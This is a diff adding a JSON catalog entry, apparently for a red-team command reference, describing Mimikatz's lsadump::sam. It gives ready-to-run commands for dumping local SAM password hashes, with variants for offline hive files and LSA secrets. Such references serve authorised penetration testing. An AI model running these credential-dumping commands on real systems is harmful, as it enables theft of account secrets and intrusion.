@@ -1,0 +1,17 @@
+{
+  "id": "mimikatz-lsadump-sam",
+  "name": "Mimikatz lsadump::sam",
+  "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit",
+  "description": "Extract local SAM hashes (built-in Administrator, local users) from a live Windows host. Run as SYSTEM (token::elevate) for direct registry access.",
+  "platform": "windows",
+  "requires": ["local-admin"],
+  "protocols": [],
+  "tags": ["mimikatz", "sam", "local-hashes"],
+  "variations": [
+    { "label": "From Hive Files", "requires": "shell", "command": "mimikatz.exe \"lsadump::sam /sam:SAM.hive /system:SYSTEM.hive\" exit" },
+    { "label": "LSA Secrets", "requires": "local-admin", "command": "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::secrets\" exit" }
+  ],
+  "examples": [
+    "mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit"
+  ]
+}
